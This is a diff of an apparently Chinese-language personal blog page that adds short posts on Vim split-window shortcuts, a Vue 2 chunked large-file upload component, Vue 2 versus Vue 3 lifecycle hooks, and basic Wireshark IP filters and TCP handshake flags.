+<li>关闭当前窗口，如果只剩最后一个了，则退出Vim<code>按键Ctrl+w q</code></li>
+</ul>
+</li>
+<li><p>移动光标</p>
+<ul>
+<li>把光标移到右边的屏 <code>按键Ctrl+w l</code></li>
+<li>把光标移到左边的屏中 <code>按键Ctrl+w h</code></li>
+<li>把光标移到上边的屏中 <code>按键Ctrl+w k</code></li>
+<li>把光标移到下边的屏中 <code>按键Ctrl+w j</code></li>
+<li>把光标移到下一个的屏中 <code>按键Ctrl+w w</code></li>
+</ul>
+</li>
+<li><p>移动分屏</p>
+<ul>
+<li>向右移动 <code>按键Ctrl+w L</code></li>
+<li>向左移动 <code>按键Ctrl+w H</code></li>
+<li>向上移动 <code>按键Ctrl+w K</code></li>
+<li>向下移动 <code>按键Ctrl+w J</code></li>
+</ul>
+</li>
+<li><p>屏幕尺寸</p>
+<ul>
+<li>让所有的屏都有一样的高度 <code>按键Ctrl+w =</code></li>
+<li>增加高度 <code>按键Ctrl+w +</code></li>
+<li>减少高度 <code>按键Ctrl+w -</code></li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7201668416171655227">cc</a></p>
+<h2 id="VIM-IDE"><a href="#VIM-IDE" class="headerlink" title="VIM IDE"></a><a target="_blank" rel="noopener" href="https://github.com/0rz33/VIM-IDE">VIM IDE</a></h2>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2025/05/28/vue-big-file-upload/">
+                vue2 大文件上传component(做成组件)
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2025-05-28</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/前端/">前端</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>前端大文件批量文件上传方案 上传的是ppvod切片服务器<br>支持：秒传、断点续传、分片上传</p>
+<h2 id="vue2-大文件上传-秒传、断点续传、分片上传"><a href="#vue2-大文件上传-秒传、断点续传、分片上传" class="headerlink" title="vue2 大文件上传 秒传、断点续传、分片上传"></a>vue2 大文件上传 秒传、断点续传、分片上传</h2><h3 id="大文件上传流程图"><a href="#大文件上传流程图" class="headerlink" title="大文件上传流程图"></a>大文件上传流程图</h3><p><img src="/images/bigfile-slice-upload.png"></p>
+<h3 id="组件页面"><a href="#组件页面" class="headerlink" title="组件页面"></a>组件页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//大文件上传组件</span><br><span class="line">Vue.component(<span class="string">&#x27;UploadFile&#x27;</span>, &#123;</span><br><span class="line">    template:`</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;div style=<span class="string">&quot;width:100%&quot;</span>&gt;</span><br><span class="line">                &lt;el-upload action=<span class="string">&quot;#&quot;</span> </span><br><span class="line">                    :show-file-list=<span class="string">&quot;false&quot;</span> </span><br><span class="line">                    :on-change=<span class="string">&quot;handleFileSelect&quot;</span> </span><br><span class="line">                multiple&gt;</span><br><span class="line">                    &lt;el-button  <span class="built_in">type</span>=<span class="string">&quot;primary&quot;</span>&gt;点击上传&lt;/el-button&gt;</span><br><span class="line">                &lt;/el-upload&gt;</span><br><span class="line">                &lt;div v-if=<span class="string">&quot;isShowProgress&quot;</span> v-for=<span class="string">&quot;(file, index) in files&quot;</span> class=<span class="string">&quot;el-upload-progress&quot;</span>&gt;</span><br><span class="line">                        &lt;!-- 进度条上方文件名 --&gt;</span><br><span class="line">                        &lt;div class=<span class="string">&quot;upload-filename&quot;</span>&gt;</span><br><span class="line">                        &lt;div&gt;&#123;&#123; file.name &#125;&#125; - &#123;&#123; file.status &#125;&#125;&lt;i class=<span class="string">&quot;el-icon-circle-close&quot;</span> @click=<span class="string">&quot;deleteFile(index)&quot;</span>&gt;&lt;/i&gt;&lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;!-- 进度条 --&gt;</span><br><span class="line">                        &lt;el-progress</span><br><span class="line">                        style=<span class="string">&quot;width: 450px&quot;</span></span><br><span class="line">                        :percentage=<span class="string">&quot;progressPercent&quot;</span> </span><br><span class="line">                        :text-inside=<span class="string">&quot;true&quot;</span></span><br><span class="line">                        :color=<span class="string">&quot;customColor&quot;</span></span><br><span class="line">                        :stroke-width=<span class="string">&quot;4&quot;</span></span><br><span class="line">                        &gt;</span><br><span class="line">                        &lt;/el-progress&gt;</span><br><span class="line">                        &lt;!-- 进度条数字 --&gt;</span><br><span class="line">                        &lt;el-input  v-model=<span class="string">&quot;file.url&quot;</span> autoComplete=<span class="string">&quot;off&quot;</span> clearable  placeholder=<span class="string">&quot;请输入地址&quot;</span>&gt;&lt;/el-input&gt;</span><br><span class="line">                        &lt;el-input  v-model=<span class="string">&quot;file.playtime&quot;</span> autoComplete=<span class="string">&quot;off&quot;</span> clearable  placeholder=<span class="string">&quot;视频时长&quot;</span>&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">    		&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    `,</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量上传文件-需要对每个切片进行文件校验-整体文件也是"><a href="#批量上传文件-需要对每个切片进行文件校验-整体文件也是" class="headerlink" title="批量上传文件  需要对每个切片进行文件校验 整体文件也是"></a>批量上传文件  需要对每个切片进行文件校验 整体文件也是</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* 添加文件 -- 多文件上传</span><br><span class="line">* @param &#123;*&#125; files 文件列表</span><br><span class="line">*/</span><br><span class="line">async add(files) &#123;</span><br><span class="line">    this.log(<span class="string">&#x27;有文件进来了&#x27;</span>)</span><br><span class="line">    // 绑定一个文件添加完成事件</span><br><span class="line">    this.out(<span class="string">&#x27;OnFileAddStart&#x27;</span>, files);</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">let</span> i=0; i &lt; files.length; i++ )&#123;</span><br><span class="line">    </span><br><span class="line">    const file = files[i];</span><br><span class="line">    const ext = <span class="string">&#x27;.&#x27;</span> +file.type.split(<span class="string">&#x27;/&#x27;</span>)[1];</span><br><span class="line">    // 验证文件类型</span><br><span class="line">    <span class="keyword">if</span> (this.mimeTypes.indexOf(ext) === -1) &#123;</span><br><span class="line">        this.log(<span class="string">&#x27;文件类型不支持&#x27;</span>)</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    //   const fileMd5 = await this.getFileMd5(file);</span><br><span class="line">    <span class="built_in">let</span> fileMd5 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    await this.getFileMd5(file)</span><br><span class="line">        .<span class="keyword">then</span>(md5 =&gt; &#123;</span><br><span class="line">            fileMd5 = md5;</span><br><span class="line">            this.log(<span class="string">&quot;计算MD5值:&quot;</span>, fileMd5);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(err =&gt; &#123;</span><br><span class="line">            this.log(<span class="string">&quot;计算MD5失败:&quot;</span>, err);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    // 验证文件是否已经再上传列表中</span><br><span class="line">    <span class="keyword">if</span> (this.files.findIndex(item =&gt; item.md5 === fileMd5) !== -1) &#123;</span><br><span class="line">        this.log(<span class="string">&#x27;文件已经在上传列表中&#x27;</span>)</span><br><span class="line">        // 跳过 循环</span><br><span class="line">        <span class="built_in">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 获取视频时长</span><br><span class="line">    <span class="built_in">let</span> playTime = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        await this.getVideoTime(file)</span><br><span class="line">        .<span class="keyword">then</span>(duration =&gt; &#123;</span><br><span class="line">            playTime = duration;</span><br><span class="line">            this.log(<span class="string">&quot;视频时长:&quot;</span>, duration, <span class="string">&quot;秒&quot;</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(err =&gt; &#123;</span><br><span class="line">            this.log(<span class="string">&quot;获取视频时长失败:&quot;</span>, err);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    // 获取文件封面</span><br><span class="line">    // const fileCover = await this.getFileCover(file,i);</span><br><span class="line">    // const fileCover = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    var fileblock = &#123;</span><br><span class="line">        fileChunks: this.slicer(file),</span><br><span class="line">        blockNum: Math.ceil(file.size / this.chunkSize), // 分片数量</span><br><span class="line">        upchunk: 0, // 已上传分片数量</span><br><span class="line">        uploaded: 0, // 已上传 字节</span><br><span class="line">    //   cover: fileCover,</span><br><span class="line">        status: <span class="string">&#x27;准备&#x27;</span>,// 上传状态</span><br><span class="line">        chunkprogress: &#123;byte: 0,percent:0&#125;, // 分片上传进度</span><br><span class="line">        name: file.name,</span><br><span class="line">        size: file.size,</span><br><span class="line">        <span class="built_in">type</span>: file.type,</span><br><span class="line">        lastModifiedDate: file.lastModifiedDate,</span><br><span class="line">        md5: fileMd5,</span><br><span class="line">        uniqueFileName: md5(<span class="string">&#x27;&#x27;</span> + this.uploadkey + file.name + file.type + file.lastModifiedDate + file.size),</span><br><span class="line">        cancel: null,</span><br><span class="line">        url: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        playtime: playTime,</span><br><span class="line">    &#125;</span><br><span class="line">    this.log(<span class="string">&quot;切片文件&quot;</span>, fileblock);</span><br><span class="line">    this.files.push(fileblock) </span><br><span class="line">    this.log(<span class="string">&#x27;第&#x27;</span> + i + <span class="string">&#x27;个文件切片成功&#x27;</span>)</span><br><span class="line">    this.out(<span class="string">&#x27;OnFileChunk&#x27;</span>, &#123; file:fileblock, index: i &#125;)</span><br><span class="line">    this.oneUpload(i, fileblock)</span><br><span class="line">    &#125;</span><br><span class="line">    this.log(<span class="string">&#x27;所有文件切片成功&#x27;</span>)</span><br><span class="line">    this.out(<span class="string">&#x27;OnFileAddEnd&#x27;</span>, this.files)</span><br><span class="line">    </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2025/05/28/vue2vsvue3/">
+                vue2 对比 vue3
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2025-05-28</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/前端/">前端</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="图层渲染"><a href="#图层渲染" class="headerlink" title="图层渲染"></a>图层渲染</h2><h3 id="VUE2-渲染流程图"><a href="#VUE2-渲染流程图" class="headerlink" title="VUE2 渲染流程图"></a>VUE2 渲染流程图</h3><p>主function<br>prop 父组件传入数据 template中使用<br>data()<br>watch 数据监听 对data数据监听<br>create()<br>methods</p>
+<p>vue init()<br>vue $mount()<br>初始化渲染watcher</p>
+<p>render 初次渲染</p>
+<p>组件模式 （自己写组件）<br>父组件（引用）<br>子组件（自己写的组件）</p>
+<p>父-&gt;子 prop 或者 data写数据 传给标签 再从标签取值<br>子-&gt;父 ref 标记 后 去除数据</p>
+<p>compment标签<br>（组件问题）</p>
+<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><table>
+<thead>
+<tr>
+<th>vue2</th>
+<th>vue3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>beforeCreate</td>
+<td></td>
+</tr>
+<tr>
+<td>created</td>
+<td></td>
+</tr>
+<tr>
+<td>beforeMount</td>
+<td>onBeforeMount</td>
+</tr>
+<tr>
+<td>mounted</td>
+<td>onMounted</td>
+</tr>
+<tr>
+<td>beforeUpdate</td>
+<td>onBeforeUpdate</td>
+</tr>
+<tr>
+<td>updated</td>
+<td>onUpdated</td>
+</tr>
+<tr>
+<td>beforeDestroy</td>
+<td>onBeforeUnmount</td>
+</tr>
+<tr>
+<td>destroyed</td>
+<td>onUnmounted</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Tips： setup 是围绕 beforeCreate 和 created 生命周期钩子运行的，所以不需要显式地去定义。</p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2025/05/28/wireshark/">
+                Wireshark
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2025-05-28</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透工具/">渗透工具</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>Wireshark是非常流行的网络封包分析软件，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程各种问题定位 </p>
+<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="过滤条件-input"><a href="#过滤条件-input" class="headerlink" title="过滤条件 input"></a>过滤条件 input</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## No. ：包的编号 ————————————默认wireshark是按照数据包编号从低到高排序，该编号不会发生改变，即使使用了过滤也同样如此</span></span><br><span class="line"><span class="comment">## Time：包的时间戳。时间格式可以自己设置</span></span><br><span class="line"><span class="comment">## Source 和Destination ：包的源地址和目的地址</span></span><br><span class="line"><span class="comment">## Protocol：包的协议类型</span></span><br><span class="line"><span class="comment">## Length：包的长度</span></span><br><span class="line"><span class="comment">## Info：包的附加信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ip过滤 ###</span></span><br><span class="line"><span class="comment">## 关于 192.168.9.167</span></span><br><span class="line">ip.addr == 192.168.9.167</span><br><span class="line"></span><br><span class="line"><span class="comment">## 请求 192.168.9.167 或者 被请求体 17.248.216.65</span></span><br><span class="line">ip.src == 192.168.9.167 or ip.dst == 17.248.216.65</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 握手包 ###</span></span><br><span class="line"><span class="comment"># SYN：Synchronize，用于初始化和建立连接，它同时也用于同步设备之间的序列号（Seq）</span></span><br><span class="line"><span class="comment"># ACK：Acknolowege，向另一方确认它已收到SYN</span></span><br><span class="line"><span class="comment"># Seq：Sequence number，序列号，用于表示曾经发送过数据的字节数+1</span></span><br><span class="line"><span class="comment"># Len：用于表示收到的字节大小，0表示本次没有收到数据</span></span><br><span class="line"><span class="comment"># FIN：用于结束连接</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2133420">https://cloud.tencent.com/developer/article/2133420</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zichliang/p/17477251.html">https://www.cnblogs.com/zichliang/p/17477251.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linyfeng/p/9496126.html">https://www.cnblogs.com/linyfeng/p/9496126.html</a>  </p>
 
         </div>
     
@@ -1182,19 +1465,19 @@
         <ul>
             
             <li>
-                <a class="footer-post" href="/2025/05/28/stock/">股市币市</a>
+                <a class="footer-post" href="/2025/05/28/pc/">PC Room</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2025/05/28/system-migration/">系统迁移</a>
+                <a class="footer-post" href="/2025/05/28/php-interview/">PHP 面试题</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2025/05/28/tree/">树 ADT</a>
+                <a class="footer-post" href="/2025/05/28/php-structure/">PHP框架</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2025/05/28/vim/">VIM</a>
+                <a class="footer-post" href="/2025/05/28/pressure-testing/">压测工具集合</a>
             </li>
             
         </ul>
@@ -1208,10 +1491,6 @@
     <ul>
         
         <li>
-            <a class="footer-post" href="/categories/%E7%A7%BB%E5%8A%A8%E7%AB%AF/">移动端</a>
-        </li>
-        
-        <li>
             <a class="footer-post" href="/categories/Blog/">Blog</a>
         </li>
         
@@ -1221,6 +1500,10 @@
         
         <li>
             <a class="footer-post" href="/categories/%E7%9F%A5/">知</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E8%AF%AD%E8%A8%80/">语言</a>
         </li>
         
     </ul>
